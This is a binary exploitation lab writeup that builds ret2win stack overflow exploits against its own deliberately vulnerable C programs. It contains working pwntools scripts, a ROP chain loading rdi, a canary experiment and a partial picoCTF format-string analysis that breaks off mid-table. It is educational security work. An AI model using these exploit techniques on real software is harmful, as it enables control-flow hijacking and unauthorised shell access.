# Binary Exploitation I - Writeup

## About the module

This module joins the two earlier stages - memory layout (01) and reading binaries (02) - into a real vulnerability. A **stack buffer overflow** happens when you write more data into a local buffer than it can hold; the write keeps going toward the higher addresses and overwrites what comes after it in the frame, including the **saved return address**. If the attacker controls the value written there, he controls where the program will jump on the `ret` instruction. This is a **control flow hijack**.

The technique used here, **ret2win**, is the simplest form: instead of injecting and running new code, you point the execution flow at a function that already exists in the program and grants access. This bypasses `NX` completely, because nothing is run from the stack.

The four exercises are built as a series on the same source code:

| Exercise | What changes | What it proves |
|----------|--------------|----------------|
| 1 | `buffer[64]`, protections off | the basic exploit works end to end |
| 2 | `buffer[88]` | the offset is found again empirically, not copied |
| 3 | stack canary on | what exactly stops the exploit, and why |
| 4 | a target function that takes an argument | the move to ROP: loading a register through a gadget |

Exercise 5 steps out of this series and deals with a format string - a completely different vector for influencing execution flow, solved on an external binary on picoGym.

The guiding thread, following module 02: **a conclusion reached by calculation is verified at runtime**. Every offset computed on paper was verified in gdb, and every failure was diagnosed from the output and not from a guess.

**Tools:** `gcc`, `checksec`, `readelf`, `GDB/pwndbg`, `pwntools` (`cyclic`, `flat`, `ELF`, `ROP`).

---

## The source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win(void) {
    printf("Access granted. Flag: entrypoint{ret2win_success}\n");
    system("/bin/sh");
}

void vulnerable(void) {
    char buffer[64];
    puts("Enter data:");
    read(0, buffer, 256);
    puts("Done.");
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    vulnerable();
    return 0;
}
```

The vulnerability is in one line: `read` reads up to **256** bytes into a buffer of size **64**. There is no bounds check, and the input is fully controlled by the attacker.

The compiler itself warns about it before we even ran anything:

```
vuln.c:13:5: warning: 'read' writing 256 bytes into a region of size 64
             overflows the destination [-Wstringop-overflow=]
   13 |     read(0, buffer, 256);
      |     ^~~~~~~~~~~~~~~~~~~~
vuln.c:11:10: note: destination object 'buffer' of size 64
```

Worth noting: this warning appears in every build across all the exercises, including the one in exercise 3 with the canary. It points at the bug itself - the protections we add later do not fix it, they only limit how it can be exploited.

## Build

```bash
gcc -g -O0 -fno-stack-protector -no-pie -o vuln vuln.c
```

| Flag | What it does | Why it is needed for learning |
|------|--------------|-------------------------------|
| `-g` | debug info | pwndbg shows the source lines next to the disassembly |
| `-O0` | no optimization | the frame stays close to the source, with no inlining and no variables folded away |
| `-fno-stack-protector` | turns the canary off | without it the overwrite is caught before the `ret`; exercise 3 brings it back |
| `-no-pie` | fixed addresses around `0x400000` | the address of `win` is the same on every run, with no need for a leak |

---

## Exercise 1 - basic ret2win

**Goal:** find the offset to the return address, build a payload that points the execution flow at `win`, and get a shell.

### 1.1 Checking the protections

The first step is to know what you are working against. `checksec` (included in pwntools):

```
$ checksec --file=vuln
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```

What each line says about the strategy:

| Protection | State | What it means |
|------------|-------|---------------|
| Stack canary | off | the return address can be overwritten freely |
| NX | **on** | shellcode on the stack will not run - so ret2win is the right technique |
| PIE | off | the address of `win` is fixed at `0x401196`, no information leak needed |
| SHSTK / IBT | marked Enabled | only a mark of CET support in the binary; in practice enforcement needs supporting hardware and kernel, and as we will see the fake `ret` went through |

The combination **NX on + PIE off + no canary** is exactly what makes ret2win the right path: running new code is not allowed, but jumping to existing code at a known address is.

### 1.2 Finding the address of win

The binary is not stripped, so the symbol is available directly:

```
$ readelf -s vuln | grep win
    30: 0000000000401196    41 FUNC    GLOBAL DEFAULT   15 win
```

`0x401196` is the address, `41` is the size in bytes, `15` is the section index (`.text`).

> **Pitfall:** `readelf` prints addresses in hex **without the `0x` prefix**. Copying `401196` straight into Python makes it read as decimal - `hex(401196)` is `0x61eec`, a garbage address, and the exploit fails with no clear explanation.

### 1.3 Finding the offset with a cyclic pattern

The idea: instead of guessing the distance from the start of the buffer to the return address, you send a pattern in which every sequence of 4 bytes appears **only once**. After the crash, the value that caused it identifies in one single way the place it came from.

```bash
python3 -c "from pwn import *; import sys; sys.stdout.buffer.write(cyclic(200))" > pattern.txt
gdb ./vuln
pwndbg> run < pattern.txt
```

The crash:

```
Program received signal SIGSEGV, Segmentation fault.
0x0000000000401201 in vulnerable () at vuln.c:15
 RBP  0x6161617261616171 ('qaaaraaa')
 RSP  0x7fffffffd508 ◂- 'saaataaauaaavaaawaaaxaaayaaaz...'
 RIP  0x401201 (vulnerable+66) ◂- ret
   0x401200 <vulnerable+65>    leave
 ► 0x401201 <vulnerable+66>    ret      <0x6161617461616173>
```

Reading the output:

- **`RIP = 0x401201`, and the instruction is `ret`.** We stopped exactly at the critical moment - the `ret` is about to pull an address off the stack, and that address is ours.
- **`RSP ◂- 'saaataaa...'`.** `RSP` points to the top of the stack, that is, exactly to the address the `ret` is about to pull. `saaataaa` are the 8 bytes that will go into RIP.
- **`ret <0x6161617461616173>`.** The same value in numeric form. Checking: `0x61 61 61 74 61 61 61 73` read from the low byte (little-endian) gives `73 61 61 61 74 61 61 61` = `saaataaa`. The two displays describe the same bytes.
- **`RBP = 'qaaaraaa'`.** The saved RBP was overwritten too, and it marks the slot before the return address.

Looking up the offsets:

```
pwndbg> cyclic -l qaaa
Found at offset 64
pwndbg> cyclic -l saaa
Found at offset 72
```

> **A pitfall I ran into: reversing the endianness twice.**
> The first try was `cyclic -l aaas` and `cyclic -l aaat`, which returned **69** and **73** - two different values, both wrong. The reason for the mistake: the value `0x6161617461616173` is a numeric form and the bytes in memory sit in the opposite order to it. But the string pwndbg shows next to `RSP` **is already in memory order** - it is a translation of the bytes as they are. Reversing it again by hand moves the search by 3 bytes, and the cyclic pattern returns an offset that does exist but is not the right one.

### 1.4 Verifying the offset

The two numbers close the structure of the frame:

```
low addresses
┌────────────────────────┐  ← [rbp-0x40]
│  buffer[64]            │  offsets   0..63
├────────────────────────┤  ← [rbp]
│  saved RBP (8)         │  offsets  64..71   ← 'qaaaraaa', verified with cyclic
├────────────────────────┤  ← [rbp+8]
│  return address (8)    │  offsets  72..79   ← 'saaataaa', verified with cyclic
└────────────────────────┘
high addresses
```

`64 + 8 = 72`. The calculation on paper and the measurement agree.

The reason these are the numbers is in the last two instructions of the function, which can be seen in the disassembly:

```asm
0x401200 <vulnerable+65>    leave
0x401201 <vulnerable+66>    ret
```

`leave` is the same as `mov rsp, rbp` and then `pop rbp` - it folds up the frame and leaves `RSP` pointing exactly at the return address. `ret` is the same as `pop rip` - it pulls those 8 bytes and jumps to them. These two instructions are the reason the offset is 72 and not 64: the `pop rbp` inside `leave` has to pass over the 8 bytes of the saved RBP first.

### 1.5 The exploit, first version

```python
from pwn import *

elf = context.binary = ELF("./vuln")
OFFSET = 72

payload = flat({OFFSET: elf.symbols["win"]})

io = process("./vuln")
io.recvuntil(b"Enter data:")
io.send(payload)
io.interactive()
```

`flat` with a dictionary builds a flat byte string where the keys are offsets: it fills up to offset 72 with padding, and at offset 72 it writes the value. Since elf.symbols["win"] is an int, flat packs it automatically into 8 bytes little-endian and there is no need for a manual p64. It takes the architecture from context, which the line context.binary = elf set from the ELF header.

### 1.6 Partial failure - stack alignment

The run:

```
[*] Switching to interactive mode
Done.
Access granted. Flag: entrypoint{ret2win_success}
[*] Got EOF while reading in interactive
$ ls
[*] Process './vuln' stopped with exit code -11 (SIGSEGV)
```

**Half of it worked.** The flag was printed, which means the control flow hijack worked fully: we reached `win` and it started running. What crashed is the `system("/bin/sh")` on the line after the `printf`.

This observation is what points at the cause. If the jump had failed, nothing would have been printed. If the address had been wrong, the crash would have been immediate. The fact that `printf` survived and `system` did not points at something that changed between the two calls - and the suspect is **stack alignment**.

**The rule:** the x86-64 ABI (System V) requires `RSP` to be divisible by 16 at the moment a `call` is executed. From this we can see what happens inside a function that is called properly:

```
before the call:        RSP ≡ 0  (mod 16)    ← the requirement
the call pushes 8:      RSP ≡ 8  (mod 16)    ← entry into the function
push rbp (prologue):    RSP ≡ 0  (mod 16)    ← body of the function
```

glibc builds on this. Inside `system` there are instructions that crash if the address is not a multiple of 16. There is no fallback. `printf` in simple use does not reach such instructions, and that is why it survived.

**What happened to us:** we reached `win` through a `ret` and not through a `call`. `ret` **raises** `RSP` by 8; `call` **lowers** it by 8. Exactly the opposite. From the numbers of the session:

```
RSP at the ret:    0x7fffffffd508    →  0x08 ≡ 8  (mod 16)
after the ret:     0x7fffffffd510    →  0x10 ≡ 0  (mod 16)
```

We entered `win` with `RSP ≡ 0`, while a function expects to be entered with `RSP ≡ 8`. A difference of 8 for the whole length of the function:

| | after a proper `call` | our exploit |
|---|---|---|
| entry into the function | `≡ 8` | `≡ 0` |
| after `push rbp` | `≡ 0` ✓ | `≡ 8` ✗ |

### 1.7 The fix - a ret gadget

```python
rop = ROP(elf)
ret = rop.find_gadget(["ret"])[0]

payload = flat({OFFSET: [ret, elf.symbols["win"]]})
```

`ROP(elf)` disassembles the executable sections and builds a catalog of every sequence that ends in a `ret`. `find_gadget(["ret"])` returns a `Gadget(address, instructions, regs, move)` object, and `[0]` pulls the address out of it (the same as `.address`).

The gadget is a single byte, `0xc3`, and all it does is pull the next value off the stack and jump to it. But in that move `RSP` shifts by 8, and that is all that was missing:

```
offset 72:  the gadget address   ← the ret of vulnerable jumps here   (RSP ≡ 8 → ≡ 0)
offset 80:  the win address      ← the gadget jumps here              (RSP ≡ 0 → ≡ 8) ✓
```

`win` now starts with `RSP ≡ 8`, exactly as after a proper `call`, and after its `push rbp` the alignment is correct.

> **Note:** the fix is not universal. It was needed here because `RSP` was `≡ 8` at the moment of the `ret`; had it been `≡ 0`, adding the gadget would have **broken** a correct alignment. The value is set by the frame size of the vulnerable function, so it has to be checked for each binary and not assumed. A direct check: `b system` and then `p $rsp % 16` - `8` at the entry into the function is correct, `0` is not.

### 1.8 The successful run

```
$ python3 ./exploit.py
[*] '/home/amichai/vr-portfolio/03-binexp-control-flow/ret2win/vuln'
    Arch:       amd64-64-little
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
[*] Loaded 5 cached gadgets for './vuln'
[+] Starting local process './vuln': pid 7411
[*] Switching to interactive mode

Done.
Access granted. Flag: entrypoint{ret2win_success}
$ hello
/bin/sh: 1: hello: not found
$ ls
exploit.py  pattern.txt  vuln  vuln.c  vuln2  vuln2.c  writeup.md
$ exit
```

The shell answers commands (`ls` returned the contents of the directory, `hello` returned a real `/bin/sh` error) - this is the proof that it is a live shell and not just the flag being printed. **Full control over the execution flow was achieved.**

### 1.9 The final payload structure

| offset | size | content | purpose |
|--------|------|---------|---------|
| 0..71 | 72 | cyclic padding | filling the buffer and the saved RBP up to the return address |
| 72..79 | 8 | address of the `ret` gadget | aligning `RSP` to a multiple of 16 |
| 80..87 | 8 | `0x401196` (`win`) | the actual jump target |

88 bytes in total, far below the 256 that the `read` is willing to take.

### 1.10 The path in brief

`checksec` (NX on → ret2win; PIE off → fixed address) ← `readelf -s` (finding `win`) ← `cyclic` in gdb (offset 72) ← `flat` to build the payload ← diagnosing the partial failure (flag printed, `system` crashed) ← a `ret` gadget for alignment ← shell. Every offset computed on paper was verified against the actual crash.

---

## Exercise 2 - changing the buffer size

**Goal:** change the buffer size in the source code, rebuild, and find the offset again.

The buffer size was changed to **88** (`vuln2.c`), and the rest of the code stayed the same.

```bash
gcc -g -O0 -fno-stack-protector -no-pie -o vuln2 vuln2.c
```

### 2.1 The naive expectation and the actual result

The calculation that worked in exercise 1 was `buffer size + 8`. Applying it directly gives `88 + 8 = 96`. Finding the offset again shows a different picture:

```
 RBP  0x6261617a61616179 ('yaaazaab')
 RSP  0x7fffffffd508 ◂- 'baabcaabdaabeaabfaabgaab...'
 RIP  0x401201 (vulnerable+66) ◂- ret
```

```
pwndbg> cyclic -l yaaazaab
Found at offset 96
pwndbg> cyclic -l baab
Found at offset 104
```

The saved RBP is at **96** - exactly where the naive calculation landed. But the return address is at **104**, eight bytes further on.

### 2.2 Explanation - padding for frame alignment

The difference is **8 bytes of padding** between the end of the buffer and the saved RBP:

```
buffer[88]       offsets   0..87
padding           offsets  88..95   ← the compiler rounded the frame up from 88 to 96
saved RBP         offsets  96..103
return address    offsets 104..111
```

The reason is the same 16-byte alignment rule we saw in exercise 1, this time on the compiler's side and not the exploit's. For `RSP` to stay aligned for the whole length of the function, the frame size has to be a multiple of 16. So the compiler rounds up to 96 and allocates `sub rsp, 0x60`.

In exercise 1 the value 64 was **already** a multiple of 16, so there was no padding at all and the calculation `64 + 8 = 72` came out right. That was a convenient case, not a rule.

**The check from the disassembly.** We check the frame size - it is written in the code:

```
pwndbg> disassemble vulnerable
Dump of assembler code for function vulnerable:
   0x4011bf <+0>:     endbr64
   0x4011c3 <+4>:     push   rbp
   0x4011c4 <+5>:     mov    rbp,rsp
   0x4011c7 <+8>:     sub    rsp,0x60
   0x4011cb <+12>:    lea    rax,[rip+0xe70]        # 0x402042
   0x4011d2 <+19>:    mov    rdi,rax
   0x4011d5 <+22>:    call   0x401070 <puts@plt>
   0x4011da <+27>:    lea    rax,[rbp-0x60]
   0x4011de <+31>:    mov    edx,0x100
   0x4011e3 <+36>:    mov    rsi,rax
   0x4011e6 <+39>:    mov    edi,0x0
   0x4011eb <+44>:    call   0x401090 <read@plt>
   ...
   0x401200 <+65>:    leave
   0x401201 <+66>:    ret
End of assembler dump.
```

Two instructions close the claim:

| Instruction | What it verifies |
|-------------|------------------|
| `sub rsp,0x60` | the frame is **96** bytes, not 88 - the compiler's rounding, in black and white |
| `lea rax,[rbp-0x60]` | the buffer starts 96 bytes below `rbp`, and this is the address passed to `read` in `rsi` |

So `buffer[88]` takes `[rbp-0x60]` up to `[rbp-0x09]`, and the eight bytes `[rbp-0x08]` up to `[rbp-0x01]` are left empty - the padding. The `mov edx,0x100` in that same block is the third argument of `read`, that is 256 bytes into a space of 88: the vulnerability itself, visible in three instructions in a row.

### 2.3 The method lesson

**The size of the variable in the source code is not the size of the space it takes on the stack.** The compiler adds padding, reorders variables, and aligns the frame - all of these are its decisions, not a promise of the language.

So the right way to find an offset is always one of two:
1. **Empirically** - `cyclic` and reading the value that caused the crash.
2. **From the disassembly** - reading the `sub rsp, N` and the offset of the buffer from `rbp`.

And never `sizeof(buffer) + 8` from the source.

### 2.4 The result

Updating `OFFSET = 104` in `exploit2.py`, with no other change:

```
[+] Starting local process './vuln2': pid 8894
[*] Switching to interactive mode

Done.
Access granted. Flag: entrypoint{ret2win_success}
$ echo hello
hello
$ exit
```

The `ret` gadget is needed here too: `RSP` at the moment of the `ret` was `0x7fffffffd508`, that is `≡ 8 (mod 16)` - exactly the same state as in exercise 1.

---

## Exercise 3 - building with a stack canary

**Goal:** rebuild with the canary on, run the same exploit, and document why it fails now - what exactly the canary did and how the program detected the overwrite.

### 3.1 The build

This time **without** the `-fno-stack-protector` flag:

```bash
gcc -g -O0 -no-pie -o vuln vuln.c
```

The code is exactly the same as in exercise 1 - the same `buffer[64]`, the same `read(0, buffer, 256)`. The compiler warning about the overflow appears exactly as before. **The vulnerability was not fixed**, only a protection was added around it.

`checksec` confirms the one change:

```
    Stack:      Canary found          ← was: No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

### 3.2 The result

The same exploit, with no change:

```
[*] Switching to interactive mode

Done.
*** stack smashing detected ***: terminated
[*] Got EOF while reading in interactive
$
[*] Process './vuln' stopped with exit code -6 (SIGABRT)
```

### 3.3 Reading the output - three observations

**`Done.` was printed.** The function `vulnerable` ran all the way to its end. The `read` succeeded, the overflow happened in full, and the `puts("Done.")` after it ran. The overwrite **was not prevented** - it happened as usual.

**`*** stack smashing detected ***` instead of the flag.** The message comes from glibc, not from the program. It is printed from inside `__stack_chk_fail`.

**`SIGABRT` (exit code `-6`), not `SIGSEGV`.** This is the most important difference. In exercise 1 we got `SIGSEGV` (`-11`) - the program tried to access invalid memory and the CPU stopped it. Here it is a deliberate **`abort()`**: the program itself found that something was broken, printed a message, and killed itself. This is a controlled failure, not a crash.

### 3.4 What the canary does - the mechanism

The canary is a random value that the compiler plants between the local variables and the saved RBP and the return address. It does not stop the danger, it warns that it arrived.

The canary value is read from the thread's TLS area and is set by the kernel when the process is loaded. It is random on every run, so it cannot be guessed. On top of that it usually holds a leading `\x00` byte, which blocks attempts to find it using string functions.

**Why this works against a classic overflow:** the overwrite is **continuous** - it writes from low to high without skipping. To reach the return address you have to pass through the canary and overwrite it too. Here is what happened here:

```
low addresses
┌────────────────────────┐
│  buffer[64]            │  ← our payload starts here
├────────────────────────┤
│  canary (8)            │  ← overwritten on the way, with no way around it
├────────────────────────┤
│  saved RBP (8)         │  ← overwritten
├────────────────────────┤
│  return address (8)    │  ← our target
└────────────────────────┘
high addresses
```

At the epilogue, the comparison failed, `__stack_chk_fail` was called, and the program died **before** the `ret` even ran. The address the payload planted in the return address was there, ready - it was simply never read.

### 3.5 Why updating the offset will not help

The thought that "the offset changed because the frame grew, so it has to be found again like in exercise 2" is not accurate, because the continuous overwrite will still pass through the canary on the way. The problem is not the location of the return address, but the fact that there is a guard on the way to it.

### 3.6 What is actually needed to bypass it

| Approach | The idea | Why it is relevant |
|----------|----------|--------------------|
| **Information leak** | leak the canary value (format string, overread), then include it in the payload at its exact place | the common path; needs a **second** vulnerability on top of the overflow |
| **Non-continuous write** | a vulnerability that allows writing to an arbitrary offset (for example a negative index into an array) and skipping over the canary | the canary assumes continuity; whoever is not continuous never meets it |
| **A target other than the return address** | overwriting a function pointer, a GOT entry, or another local variable that sits **before** the canary | not every control flow hijack goes through the `ret` |

All of them go beyond the scope of ret2win and are the subject of the next module (04 - Defeating Mitigations).

### 3.7 What this teaches about the protection

The canary **does not fix the vulnerability**. The `gcc` warning about the overflow appeared exactly as before, the `read` still writes 256 bytes into 64, and the overwrite still happens in full. The only thing that changed is what happens **after** the overwrite: instead of a quiet hijack, there is detection and an abort.

From this, two takeaways:

1. **The protection is detection, not prevention.** Memory was overwritten, and other data structures may have been damaged too. The program simply refuses to continue from the moment it finds out.
2. **Availability is hurt either way.** Even when the canary "wins", the attacker turned a buffer overflow into a reliable crash. In production that counts as a DoS. The protection lowers the severity of the vulnerability from RCE to DoS; it does not bring it to zero.

### 3.8 The path in brief

Building without `-fno-stack-protector` ← `checksec` confirms `Canary found` ← the same exploit ← `Done.` is still printed (the overwrite happened), but `*** stack smashing detected ***` and `SIGABRT` instead of the flag ← updating the offset will not help, and a second vulnerability (a leak) or a non-continuous write is needed.

---

## Exercise 4 - passing an argument through rdi

**Goal:** add a function that takes an argument and grants access only if it equals a certain value, and update the exploit so that it also passes the right value through `rdi` using a gadget.

The code (`vuln3.c`) replaces the `win` without an argument with a version that checks a code:

```c
void win(int code) {
    if (code == 151060) {
        printf("Access granted. Flag: entrypoint{ret2win_success}\n");
        system("/bin/sh");
    }
    else {
        printf("Access denied. Invalid code.\n");
    }
}
```

This is the move from ret2win to real ROP: until now we only jumped to a target, from here on we also pass data.

The two separate paths in the function turn the run itself into a verification.

### 4.1 The mechanism - how a register can be loaded at all

The main insight: **in a ROP chain, the stack is both the program and the data store.** Every gadget "consumes" a number of slots from the stack according to its instructions, and all of those slots are bytes the attacker wrote.

The classic gadget `pop rdi; ret` is two instructions, and both read from the stack:

```
pop rdi   →  takes 8 bytes from the top of the stack into rdi,  RSP += 8
ret       →  takes 8 bytes from the top of the stack into RIP,  RSP += 8
```

The first value becomes the argument, the second becomes the jump target. According to the System V ABI the first argument of any function arrives in `rdi`, so from the function's point of view this looks exactly like a normal call - it cannot tell that nobody did a `call`.

### 4.2 The problem - the gadget does not exist

```
$ ROPgadget --binary vuln --only "pop|ret"
0x000000000040117d : pop rbp ; ret
0x000000000040101a : ret
0x000000000040105a : ret 0xffff

Unique gadgets found: 3
```

And in a scan with no filter - **71 gadgets in total**, and the only `pop` among them is `pop rbp`. (A scan of `vuln2` gives exactly the same number; the two dynamic binaries are identical in their gadget surface, as expected from almost identical source code and the same flags.)

**The historical reason:** the gadget `pop rdi; ret` came for years "for free" from `__libc_csu_init`, an init function that the compiler planted in every binary. **In glibc 2.34 it was removed.** Ubuntu 24.04 runs glibc 2.39, so a small dynamic binary no longer holds it. The guide, written before the change, assumes the gadget exists - but in my environment it does not.

### 4.3 The solution - a static build

```bash
gcc -g -O0 -fno-stack-protector -no-pie -static -o vuln3 vuln3.c
```

`-static` links all of libc into the binary. The source code does not change at all, and `elf.symbols` keeps working as usual - only the gadget surface grows. The check:

```
$ ROPgadget --binary vuln3 --only "pop|ret" | grep "pop rdi"
0x0000000000402188 : pop rdi ; pop rbp ; ret
```

Found. And a full scan shows the scale of the change:

| Binary | Linking | Gadgets (ROPgadget) | `pop rdi` |
|--------|---------|---------------------|-----------|
| `vuln` | dynamic | 71 | none |
| `vuln2` | dynamic | 71 | none |
| `vuln3` | static | **37,023** | yes |

### 4.4 A side effect - "Canary found" that is not a canary

`checksec` on the static binary reports:

```
    Stack:      Canary found
```

This is a **false positive**. `checksec` detects a canary by the presence of the `__stack_chk_fail` symbol, and in a static binary glibc itself is compiled with the stack protector - so the symbol gets into the binary even when our code was compiled with `-fno-stack-protector`.

The check that this is indeed so, from running the cyclic pattern on `vuln3`:

```
Program received signal SIGSEGV, Segmentation fault.
0x0000000000401991 in vulnerable () at vuln3.c:20
 RBP  0x6161617261616171 ('qaaaraaa')
 RSP  0x7fffffffd508 ◂- 'saaataaauaaavaaawaaaxaaayaaaz...'
 RIP  0x401991 (vulnerable+66) ◂- ret
```

```
pwndbg> cyclic -l saaataaauaaa...
Found at offset 72
```

| Sign | In exercise 3 (a real canary) | Here |
|------|-------------------------------|------|
| signal | `SIGABRT` (`-6`) | `SIGSEGV` (`-11`) |
| message | `*** stack smashing detected ***` | none |
| stop point | `__stack_chk_fail` | `0x401991 <vulnerable+66> ◂- ret` |
| offset | - | 72 |

If `vulnerable` had a canary, the program would have stopped at `__stack_chk_fail` before the `ret` - exactly as happened in exercise 3. Instead it reached the `ret` and overwrote RIP as usual. **`vulnerable` has no canary.**

Two more conclusions from the same run:

- **The offset stayed 72.** Even though the binary is completely different in size and layout, the frame did not change - the same `buffer[64]` and the same compilation flags.
- **`RSP = 0x7fffffffd508` at the moment of the `ret`**, that is `≡ 8 (mod 16)` - the same alignment state as in exercises 1-2, which lets us apply the slot counting rule of 4.6.

**The method lesson:** `checksec` reports on the whole binary, not on the function we care about. In a static binary the canary report is almost meaningless, and it has to be checked at the function level.

### 4.5 Using the gadget that was found

```
pop rdi ; pop rbp ; ret
```

By the rule from 4.1, the three instructions consume three slots:

```
pop rdi   →  slot 1  →  rdi   (the argument)
pop rbp   →  slot 2  →  rbp   (a dummy value)
ret       →  slot 3  →  RIP   (the target)
```

So the chain needs one padding value between the argument and the target:

```python
pop_rdi_rbp = rop.find_gadget(["pop rdi", "pop rbp", "ret"])[0]
payload = flat({OFFSET: [pop_rdi_rbp, 151060, 0, elf.symbols["win"]]})
```

### 4.6 The alignment - why a ret gadget is not needed this time

In exercises 1-2 a single `ret` gadget was needed for alignment. **Here it would have broken the alignment instead of fixing it**, and the extra `pop rbp` does its job.

The rule, when `RSP ≡ 8 (mod 16)` at the moment of the `ret` of the vulnerable function: count the number of slots from `OFFSET` up to and including the slot that holds the target address. **An even number = the alignment is correct.**

The `ret` of `vulnerable` starts at `RSP ≡ 8`, and every slot consumed adds 8 and flips the parity. The function is entered with `RSP ≡ 8 + 8N (mod 16)`, and to get `≡ 8` (the state after a proper `call`) `N` has to be even.

| Exercise | The chain | N | Alignment |
|----------|-----------|---|-----------|
| 1, without a ret gadget | `[win]` | 1 | ✗ broken - `system` crashed |
| 1-2, with a ret gadget | `[ret, win]` | 2 | ✓ |
| 4 | `[pop_rdi_rbp, 151060, 0, win]` | 4 | ✓ |
| 4, had we added a ret gadget | `[ret, pop_rdi_rbp, 151060, 0, win]` | 5 | ✗ would have broken |

### 4.7 The final exploit

```python
from pwn import *

BIN = "./vuln3"
elf = context.binary = ELF(BIN)
rop = ROP(elf)
pop_rdi_rbp = rop.find_gadget(["pop rdi", "pop rbp", "ret"])[0]

CODE = 151060
OFFSET = 72

payload = flat({OFFSET: [pop_rdi_rbp, CODE, 0, elf.symbols["win"]]})

io = process(BIN)
io.recvuntil(b"Enter data:")
io.send(payload)
io.interactive()
```

The payload structure:

| offset | size | content | purpose |
|--------|------|---------|---------|
| 0..71 | 72 | cyclic padding | filling up to the return address |
| 72..79 | 8 | `0x402188` | address of the `pop rdi; pop rbp; ret` gadget |
| 80..87 | 8 | `151060` | → `rdi`, the argument to `win` |
| 88..95 | 8 | `0` | → `rbp`, a dummy value that the `pop rbp` consumes |
| 96..103 | 8 | `0x401905` (`win`) | → `RIP`, the jump target |

### 4.8 The result

```
$ python3 ./exploit3.py
[*] '/home/amichai/vr-portfolio/03-binexp-control-flow/ret2win/vuln3'
    Stack:      Canary found          ← false positive, see 4.4
    NX:         NX enabled
    PIE:        No PIE (0x400000)
[*] Loaded 50 cached gadgets for './vuln3'
[+] Starting local process './vuln3': pid 23210
[*] Switching to interactive mode

Done.
Access granted. Flag: entrypoint{ret2win_success}
$ echo hello
hello
$
```

**The exploit verifies itself.** `win` prints `Access denied. Invalid code.` if the argument is wrong, and the flag only if `code == 151060`. The fact that the flag was printed is direct proof that `rdi` carried the right value at the moment of entry into the function - with no need to stop in gdb and read the register. Choosing a function with two separate paths is what turns the run itself into a verification.

### 4.9 Automatic regression - verify.sh

verify.sh rebuilds the three targets from source and checks two claims that go together: that the exploits work, and that wrong input does not work.
```
$ ./verify.sh
rebuilding targets from source

--- the exploits should work ---
[PASS] exploit.py  -> vuln  (offset 72,  [ret, win])
[PASS] exploit2.py -> vuln2 (offset 104, [ret, win])
[PASS] exploit3.py -> vuln3 (offset 72,  [pop_rdi_rbp, 151060, 0, win])
[PASS] exploit3.py: win() took the granted branch - rdi carried 151060

--- wrong input should NOT work ---
[PASS] plain garbage input gives no flag
[PASS] offset 73 (the endianness mistake) gives no flag
[PASS] code 151059 reaches win() but is denied - rdi is what decides

--- 7 passed, 0 failed ---
the exploits work, and wrong input does not.
```

#### What is checked

**The positive part** - the three exploits against freshly built binaries:

| Script | Target | Chain |
|--------|--------|-------|
| `exploit.py` | `vuln` (dynamic, `buffer[64]`) | offset 72, `[ret, win]` |
| `exploit2.py` | `vuln2` (dynamic, `buffer[88]`) | offset 104, `[ret, win]` |
| `exploit3.py` | `vuln3` (static, `win(int)`) | offset 72, `[pop_rdi_rbp, 151060, 0, win]` |


**The negative part** - three inputs, and each one changes one single thing from a working payload:

| The input | The claim it isolates |
|-----------|------------------------|
| `b'A' * 200` to `vuln` | a crash by itself does not print the flag. |
| offset **73** instead of offset 72 | the offset is not an arbitrary number |
| code **151059** instead of 151060 in `vuln3` | `rdi` is what decides, and not reaching `win` |

### 4.10 The path in brief

A `ROPgadget` scan proves there is no `pop rdi` in the binary at all ← finding the reason: `__libc_csu_init` was removed in glibc 2.34 ← rebuilding with `-static` ← the gadget is found, but in the form `pop rdi; pop rbp; ret` which needs one more slot ← `cyclic` in gdb verifies offset 72 and `RSP ≡ 8` ← counting slots shows that the alignment gadget is no longer needed ← `rdi` carries the value, `win` prints the flag and opens a shell.

---

## Exercise 5 - format string 0 (picoGym)

**Link:** https://learn.cylabacademy.org/library/433
**Flag:** `academy{7h3_cu570m3r_15_n3v3r_SEGFAULT_9582df7b}` · Category: Binary Exploitation · Rating: Easy · picoCTF 2024

### 5.1 The vulnerability
**Source:** `format-string-0.c` is the challenge's own source, provided by picoGym and included here for reference.
Two lines in the whole file hold the bug:

```c
int count = printf(choice1);   // serve_patrick
printf(choice2);               // serve_bob
```

The user's input is passed as a **format string** and not as an argument. The correct way to write it is `printf("%s", choice1)`. In the vulnerable version, every `%` in the input is read as a formatting instruction, and `printf` reaches for arguments that were never supplied - that is, for the contents of the registers and the stack.

**What makes the challenge interesting:** `on_menu` makes sure the input matches exactly one of three fixed strings. You cannot supply an arbitrary format string. The task is not to write an exploit but **to identify which of the ready-made strings does what** - an exercise in reading format specifiers.

A third starting point, in `main`, is what makes a crash a desirable goal:

```c
void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}
...
signal(SIGSEGV, sigsegv_handler);
```

The developer installed a handler that prints the flag on a crash. So the target is not a hijack but **to cause a SIGSEGV**.

### 5.2 First junction - the length gate

```c
int count = printf(choice1);
if (count > 2 * BUFSIZE) {     // BUFSIZE = 32, that is > 64
    serve_bob();
}
```

The critical point: `printf` returns the number of characters that were **printed**, not the length of the input. In correct code the two are the same, and exactly here the gap opens.

| Option | Input length | Output length | Passes? |
|--------|--------------|---------------|---------|
| `Breakf@st_Burger` | 16 | 16 | ✗ |
| `Bac0n_D3luxe` | 12 | 12 | ✗ |
| `Gr%114d_Cheese` | 14 | **123** | ✓ |

The calculation for `Gr%114d_Cheese`: `Gr` (2) + `%114d` which pads a number to a width of 114 characters (114) + `_Cheese` (7) = **123**, far above the threshold of 64.

An input of 14 bytes produced an output of 123. That is what the format string achieves: nine times more output without writing a single byte past the buffer.

In practice:

```
Enter your recommendation: Gr%114d_Cheese
Gr                                                           4202954_Cheese
```

The number `4202954` (that is `0x4021CA`) is not random - it is the value that was in the second argument register at the time of the call, and `%d` printed it. This is an **information leak**, the classic primitive of a format string. In this challenge it is a side effect, but in a real exploit this is the way to leak addresses and bypass ASLR or a canary.

The other two options do not crash the program but print `Patrick is still hungry!` and return control to `main`, which exits quietly. With no flag.

### 5.3 Second junction - the crash

```c
printf(choice2);   // no length check this time
```

| Option | Analysis | Crashes? |
|--------|----------|----------|
